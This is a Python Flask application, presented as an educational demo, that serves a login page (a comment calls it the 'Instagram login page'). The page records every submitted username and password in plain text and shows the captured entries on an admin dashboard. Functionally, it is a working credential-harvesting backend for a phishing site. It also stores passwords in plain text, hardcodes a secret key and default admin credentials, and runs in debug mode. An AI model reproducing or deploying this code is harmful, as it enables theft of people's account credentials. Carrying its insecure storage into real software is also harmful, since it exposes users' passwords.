from flask import Flask, render_template, request, redirect, url_for, session, g
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'dev-key-for-education-only-12345'

# Database setup
DATABASE = 'database.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        cursor = db.cursor()
        
        # Check if old tables exist
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
        table_exists = cursor.fetchone()
        
        if table_exists:
            cursor.execute("PRAGMA table_info(users)")
            columns = [col[1] for col in cursor.fetchall()]
            
            if 'password_plain' not in columns:
                cursor.execute("DROP TABLE IF EXISTS users")
                cursor.execute("DROP TABLE IF EXISTS login_attempts")
                cursor.execute("DROP TABLE IF EXISTS admin_users")
        
        # Create users table (for regular users)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_plain TEXT NOT NULL,
                password_hash TEXT NOT NULL,
                created_at TEXT NOT NULL
            )
        ''')
        
        # Create login attempts table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS login_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                entered_password TEXT NOT NULL,
                stored_plain TEXT,
                stored_hash TEXT,
                timestamp TEXT NOT NULL,
                success INTEGER NOT NULL,
                plain_match INTEGER NOT NULL,
                hash_match INTEGER NOT NULL,
                message TEXT
            )
        ''')
        
        # Create admin users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL
            )
        ''')
        
        # Insert default admin user
        cursor.execute("SELECT * FROM admin_users WHERE username = 'admin'")
        if not cursor.fetchone():
            cursor.execute('''
                INSERT INTO admin_users (username, password_hash)
                VALUES (?, ?)
            ''', ('admin', generate_password_hash('admin123')))
        
        # Insert default regular users
        default_users = [
            ('admin', 'admin123'),
            ('test', 'test123'),
            ('student', 'learn456')
        ]
        
        for username, password in default_users:
            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
            if not cursor.fetchone():
                cursor.execute('''
                    INSERT INTO users (username, password_plain, password_hash, created_at)
                    VALUES (?, ?, ?, ?)
                ''', (username, password, generate_password_hash(password), datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        
        db.commit()

# Initialize database
init_db()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    db = get_db()
    cursor = db.cursor()
    
    # Get user data
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    
    # Build attempt record
    attempt = {
        'username': username,
        'entered_password': password,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'success': False,
        'plain_match': False,
        'hash_match': False,
        'stored_plain': None,
        'stored_hash': None,
        'message': ''
    }
    
    if user:
        attempt['stored_plain'] = user['password_plain']
        attempt['stored_hash'] = user['password_hash']
        attempt['plain_match'] = password == user['password_plain']
        
        try:
            attempt['hash_match'] = check_password_hash(user['password_hash'], password)
        except:
            attempt['hash_match'] = False
        
        if attempt['plain_match'] or attempt['hash_match']:
            attempt['success'] = True
            attempt['message'] = 'Login successful'
            session['username'] = username
        else:
            attempt['message'] = 'Invalid credentials'
    else:
        attempt['message'] = 'User not found'
    
    # Store the attempt in database
    cursor.execute('''
        INSERT INTO login_attempts 
        (username, entered_password, stored_plain, stored_hash, timestamp, success, plain_match, hash_match, message)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        attempt['username'],
        attempt['entered_password'],
        attempt['stored_plain'],
        attempt['stored_hash'],
        attempt['timestamp'],
        1 if attempt['success'] else 0,
        1 if attempt['plain_match'] else 0,
        1 if attempt['hash_match'] else 0,
        attempt['message']
    ))
    db.commit()
    
    # Stay on the Instagram login page
    return redirect(url_for('home'))

# Admin Login Page
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('identity')
        password = request.form.get('password')
        
        db = get_db()
        cursor = db.cursor()
        cursor.execute("SELECT * FROM admin_users WHERE username = ?", (username,))
        admin = cursor.fetchone()
        
        if admin and check_password_hash(admin['password_hash'], password):
            session['admin_logged_in'] = True
            return redirect(url_for('admin'))
        else:
            return render_template('login.html', error='Invalid admin credentials!')
    
    return render_template('login.html')

# Admin Dashboard
@app.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    db = get_db()
    cursor = db.cursor()
    
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()
    
    cursor.execute("SELECT * FROM login_attempts ORDER BY id DESC")
    attempts = cursor.fetchall()
    
    return render_template('admin.html', 
                         users=users, 
                         attempts=attempts,
                         total_attempts=len(attempts),
                         total_users=len(users))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/clear_attempts')
def clear_attempts():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute("DELETE FROM login_attempts")
    db.commit()
    return redirect(url_for('admin'))

@app.route('/reset_users')
def reset_users():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute("DELETE FROM users")
    
    default_users = [
        ('admin', 'admin123'),
        ('test', 'test123'),
        ('student', 'learn456')
    ]
    for username, password in default_users:
        cursor.execute('''
            INSERT INTO users (username, password_plain, password_hash, created_at)
            VALUES (?, ?, ?, ?)
        ''', (username, password, generate_password_hash(password), datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    
    cursor.execute("DELETE FROM login_attempts")
    db.commit()
    
    return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

if __name__ == '__main__':
    print("\n" + "="*60)
    print("⚠️  EDUCATIONAL DEMO - PASSWORDS VISIBLE IN PLAIN TEXT  ⚠️")
    print("⚠️  DO NOT USE THIS IN PRODUCTION!                     ⚠️")
    print("="*60 + "\n")
    print("📍 Login Page: http://127.0.0.1:5000")
    print("📍 Admin Login: http://127.0.0.1:5000/admin/login")
    print("📍 Admin Dashboard: http://127.0.0.1:5000/admin")
    print("\n📝 Test Credentials:")
    print("   Username: admin  | Password: admin123")
    print("   Username: test   | Password: test123")
    print("   Username: student| Password: learn456")
    print("\n🔐 Admin Login:")
    print("   Username: admin  | Password: admin123")
    print("\n" + "="*60 + "\n")
    
    app.run(debug=True, host='127.0.0.1', port=5000)
